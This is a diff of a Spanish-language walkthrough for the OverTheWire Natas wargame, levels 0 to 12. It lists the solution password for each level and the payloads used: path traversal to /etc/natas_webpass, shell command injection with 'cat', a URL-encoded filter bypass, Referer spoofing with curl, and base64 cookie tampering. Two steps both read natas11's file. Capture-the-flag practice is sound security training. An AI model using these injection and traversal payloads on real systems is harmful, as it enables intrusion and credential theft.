@@ -12,120 +12,125 @@ Para el nivel 0:
     Usuario: natas0
     Contraseña: natas0
 
-*Nivel 0 → Nivel 1: 
-    Se inspecciona el código fuente de la página.
+*Nivel 0 → Nivel 1:
+    Se inspecciona el código fuente de la página con F12 → pestaña "Elements".
     Se encuentra un comentario HTML que contiene la contraseña.
 
     comandos:
     <!-- The password for natas1 is 0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq -->
 
-                contraseña 0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq
+                            contraseña: 0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq
 
-*Nivel 1 → Nivel 2: 
-    Se inspecciona el código fuente de la página.
-    Se observa una imagen con enlace hacia /files/.
-    Se accede a dicha ruta y se encuentra la contraseña.
+*Nivel 1 → Nivel 2:
+    Se inspecciona el código fuente de la página (F12).
+    Se observa una imagen con un enlace hacia /files/.
+    Se accede a la ruta /files/ manualmente en el navegador.
+    Dentro de /files/ se encuentra un archivo pistas.txt que contiene la contraseña.
 
     comandos:
     http://natas1.natas.labs.overthewire.org/files/pistas.txt
 
-                contraseña TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI
+                            contraseña: TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI
 
-*Nivel 2 → Nivel 3: 
-    Se prueba acceder a archivos en /files/.
-    Se encuentra el archivo users.txt que contiene la contraseña.
+*Nivel 2 → Nivel 3:
+    Se inspecciona el código fuente (F12), se observa que existe un directorio /files/.
+    Se accede manualmente a: /files/users.txt
+    El archivo contiene la contraseña.
 
     comandos:
     http://natas2.natas.labs.overthewire.org/files/users.txt
 
-                contraseña 3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH
+                            contraseña: 3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH
 
-*Nivel 3 → Nivel 4: 
-    Se accede a robots.txt para buscar rutas prohibidas.
-    Se encuentra la ruta /s3cr3t/.
-    Se accede a dicha ruta y se encuentra la contraseña.
+*Nivel 3 → Nivel 4:
+    Se accede al archivo robots.txt que indica rutas prohibidas para buscadores.
+    Allí se descubre la ruta /s3cr3t/.
+    Se navega a /s3cr3t/ y se encuentra un archivo users.txt con la contraseña.
 
     comandos:
     http://natas3.natas.labs.overthewire.org/robots.txt
     http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt
 
-                contraseña QryZXc2e0zahULdHrtHxzyYkj59kUxLQ
+                            contraseña: QryZXc2e0zahULdHrtHxzyYkj59kUxLQ
 
-*Nivel 4 → Nivel 5: 
-    Se usa la herramienta curl modificando el Referer.
-    Esto permite acceder a la página y obtener la contraseña.
+*Nivel 4 → Nivel 5:
+    La página verifica el Referer.
+    Se utiliza curl para enviar un Referer válido y obtener la contraseña.
 
     comandos:
     curl -H "Referer: http://natas5.natas.labs.overthewire.org/" -u natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ http://natas4.natas.labs.overthewire.org/
 
-                contraseña 0n35PkggAPm2zbEpOU802c0x0Msn1ToK
+                            contraseña: 0n35PkggAPm2zbEpOU802c0x0Msn1ToK
 
-*Nivel 5 → Nivel 6: 
-    Se modifica el parámetro page en la URL.
-    Se intenta leer el archivo con la contraseña.
+*Nivel 5 → Nivel 6:
+    El parámetro `page` es vulnerable a path traversal.
+    Se modifica la URL para leer el archivo de la contraseña.
 
     comandos:
     http://natas6.natas.labs.overthewire.org/?page=../../../../../etc/natas_webpass/natas7
 
-                contraseña 0RoJwHdSKWFTYR5WuiAewauSuNaBXned
+                            contraseña: 0RoJwHdSKWFTYR5WuiAewauSuNaBXned
 
-*Nivel 6 → Nivel 7: 
-    Se exploran rutas ocultas observadas en el código fuente.
-    Se accede a includes/password.txt donde está la contraseña.
+*Nivel 6 → Nivel 7:
+    Se inspecciona el código fuente (F12).
+    Se encuentra referencia a un directorio "includes".
+    Se accede a includes/password.txt manualmente.
 
     comandos:
     http://natas7.natas.labs.overthewire.org/includes/password.txt
 
-                contraseña bmg8SvU1LizuWjx3y7xkNERkHxGre0GS
+                            contraseña: bmg8SvU1LizuWjx3y7xkNERkHxGre0GS
 
-*Nivel 7 → Nivel 8: 
-    Se decodifica una cadena en base16 y base64.
-    Se obtiene la contraseña.
+*Nivel 7 → Nivel 8:
+    Se inspecciona el código fuente, se encuentra una cadena codificada en base16.
+    Se usa la herramienta online **CyberChef** para decodificar la cadena: primero Hex → Base64 → texto.
 
     comandos:
-    3d3d516343746d4d6d6c315669563362
-    Decodificado en CyberChef.
+    Cadena: 3d3d516343746d4d6d6c315669563362
+    CyberChef: From Hex → From Base64 → Result → contraseña
 
-                contraseña xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q
+                            contraseña: xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q
 
-*Nivel 8 → Nivel 9: 
-    Se utiliza inyección de comandos en el parámetro needle.
-    Se logra leer la contraseña.
+*Nivel 8 → Nivel 9:
+    Se utiliza inyección de comandos en el parámetro `needle`.
+    Se agrega un comando `cat` para leer la contraseña.
 
     comandos:
     http://natas9.natas.labs.overthewire.org/?needle=; cat /etc/natas_webpass/natas10&submit=Search
 
-                contraseña ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t
+                            contraseña: ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t
 
-*Nivel 9 → Nivel 10: 
-    Se utiliza inyección de comandos con bypass de filtro.
-    Se logra leer la contraseña.
+*Nivel 9 → Nivel 10:
+    El filtro bloquea ciertos caracteres.
+    Se utiliza codificación URL para saltarse el filtro y leer la contraseña.
 
     comandos:
     http://natas10.natas.labs.overthewire.org/?needle=u+%2Fetc%2Fnatas_webpass%2Fnatas11&submit=Search
 
-                contraseña t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu
+                            contraseña: t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu
 
-*Nivel 10 → Nivel 11: 
-    Se utiliza un comando con $() o backticks.
-    Se logra leer la contraseña.
+*Nivel 10 → Nivel 11:
+    Se usa la sintaxis `$(cat ...)` para ejecutar el comando de lectura de contraseña.
 
     comandos:
     $(cat /etc/natas_webpass/natas11)
+    (insertado en el parámetro vulnerable de la página)
 
-                contraseña UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk
+                            contraseña: UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk
 
-*Nivel 11 → Nivel 12: 
-    Se decodifica la cookie de la sesión (base64).
-    Se modifica el parámetro admin a true.
-    Se recodifica y se reenvía al navegador.
-    La contraseña es mostrada.
+*Nivel 11 → Nivel 12:
+    Se inspecciona el valor de la cookie (base64 codificada).
+    Se decodifica con base64 para obtener un objeto serializado.
+    Se modifica la clave `admin` a true.
+    Se recodifica a base64.
+    Se reemplaza la cookie en el navegador.
+    La página muestra la contraseña.
 
     comandos:
     echo 'Tzo0OiJVc2VyIjozOntzOjU6ImFkbWluIjtiOjA7czo0OiJuYW1lIjtzOjU6Imd1ZXN0IjtzOjY6InZpc2l0cyI7aToxO30=' | base64 -d
-    # modificar admin → true
-    # recodificar con base64
+    (modificar admin → true)
+    (recodificar base64)
+    (reemplazar cookie con EditThisCookie u otra extensión)
 
-                contraseña yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB
-
+                            contraseña: yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB
 
